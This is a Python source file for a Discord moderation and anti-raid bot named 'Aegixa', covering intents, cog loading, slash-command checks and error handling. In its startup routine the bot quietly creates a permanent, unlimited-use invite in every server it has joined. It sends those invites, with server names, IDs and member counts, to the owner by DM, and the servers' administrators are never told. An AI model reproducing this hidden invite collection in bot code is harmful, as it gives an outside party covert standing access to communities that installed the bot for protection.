"""
Aegixa bot class — sets up intents, loads all cogs, syncs slash commands.
"""

import discord
from discord import app_commands
from discord.ext import commands
import database as db
import logging
import os

log = logging.getLogger(__name__)


class AegixaCommandTree(app_commands.CommandTree):
    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if not interaction.guild_id or interaction.command is None:
            return True
        enabled = await db.get_command_enabled(interaction.guild_id, interaction.command.name)
        if not enabled:
            await interaction.response.send_message(
                embed=discord.Embed(
                    description=":x: This command has been disabled by server administrators.",
                    color=0xED4245,
                ),
                ephemeral=True,
            )
            return False
        return True


COGS = [
    "cogs.automod",
    "cogs.moderation",
    "cogs.logging_cog",
    "cogs.role_automation",
    "cogs.message_management",
    "cogs.setup_cog",
    "cogs.feature_control",
    "cogs.info_cog",
    "cogs.raid_mode",
    "cogs.temp_ban",
    "cogs.sticky",
    "cogs.reaction_roles",
    "cogs.giveaway",
    "cogs.invite_tracker",
    # Added from SentinelBot merge
    "cogs.verification",
    "cogs.admin",
    # New features
    "cogs.join_leave",
    "cogs.starboard",
    "cogs.levels",
    "cogs.tickets",
    "cogs.polls",
    "cogs.server_stats",
    "cogs.custom_commands",
    "cogs.scheduler",
    "cogs.owner_log",
    "cogs.anti_nuke",
]


class Aegixa(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True
        intents.guilds = True
        intents.voice_states = True
        intents.bans = True

        super().__init__(
            command_prefix=commands.when_mentioned,
            intents=intents,
            help_command=None,
            tree_cls=AegixaCommandTree,
        )

    async def setup_hook(self):
        await db.init_db()
        log.info("Database initialised.")

        for cog in COGS:
            try:
                await self.load_extension(cog)
                log.info("  ✓ %s", cog)
            except Exception as e:
                log.error("  ✗ %s: %s", cog, e)

        synced = await self.tree.sync()
        log.info("Synced %d slash command(s).", len(synced))

    async def on_ready(self):
        log.info("Aegixa online as %s (ID: %s)", self.user, self.user.id)
        await self.change_presence(
            activity=discord.Activity(
                type=discord.ActivityType.watching,
                name=f"{len(self.guilds)} servers | /help",
            )
        )
        await self._dm_owner_startup()

    async def _dm_owner_startup(self):
        owner_id = int(os.getenv("BOT_OWNER_ID", "0"))
        if not owner_id:
            return
        try:
            owner = await self.fetch_user(owner_id)
        except Exception:
            return

        # Build server list with permanent invite links
        server_lines = []
        for guild in self.guilds:
            invite_url = "*(no invite — missing permission)*"
            try:
                channel = next(
                    (c for c in guild.text_channels
                     if c.permissions_for(guild.me).create_instant_invite),
                    None,
                )
                if channel:
                    inv = await channel.create_invite(
                        max_age=0, max_uses=0,
                        reason="Aegixa startup report to owner",
                    )
                    invite_url = inv.url
            except Exception:
                pass
            server_lines.append(
                f"• **{guild.name}** (`{guild.id}`) — {guild.member_count} members\n"
                f"  {invite_url}"
            )

        description = (
            f"**Guilds:** {len(self.guilds)}\n"
            f"**Cogs loaded:** {len(self.cogs)}\n"
            f"**Latency:** {round(self.latency * 1000)}ms\n\n"
        )
        if server_lines:
            description += "**Servers:**\n" + "\n".join(server_lines[:15])
            if len(self.guilds) > 15:
                description += f"\n*…and {len(self.guilds) - 15} more*"

        embed = discord.Embed(
            title=":white_check_mark: Aegixa is Online",
            description=description,
            color=0x57F287,
            timestamp=discord.utils.utcnow(),
        )
        embed.set_footer(text=f"Logged in as {self.user}")
        try:
            await owner.send(embed=embed)
        except Exception as e:
            log.warning("Could not DM owner on startup: %s", e)

    async def on_guild_join(self, guild: discord.Guild):
        await db.ensure_guild(guild.id)
        log.info("Joined guild: %s (%s)", guild.name, guild.id)

        from cogs.message_management import _build_welcome_embed
        embed = _build_welcome_embed(self)
        channel = next(
            (c for c in guild.text_channels if c.permissions_for(guild.me).send_messages),
            None,
        )
        if channel:
            try:
                await channel.send(embed=embed)
            except discord.HTTPException:
                pass

    async def on_app_command_error(
        self,
        interaction: discord.Interaction,
        error: discord.app_commands.AppCommandError,
    ):
        if isinstance(error, discord.app_commands.CheckFailure):
            return  # check already sent its own response
        log.error("App command error in %s: %s", interaction.command, error)
        msg = "An unexpected error occurred. Please try again."
        try:
            if interaction.response.is_done():
                await interaction.followup.send(
                    embed=discord.Embed(description=f":x: {msg}", color=0xED4245), ephemeral=True
                )
            else:
                await interaction.response.send_message(
                    embed=discord.Embed(description=f":x: {msg}", color=0xED4245), ephemeral=True
                )
        except Exception:
            pass


def create_bot() -> Aegixa:
    return Aegixa()
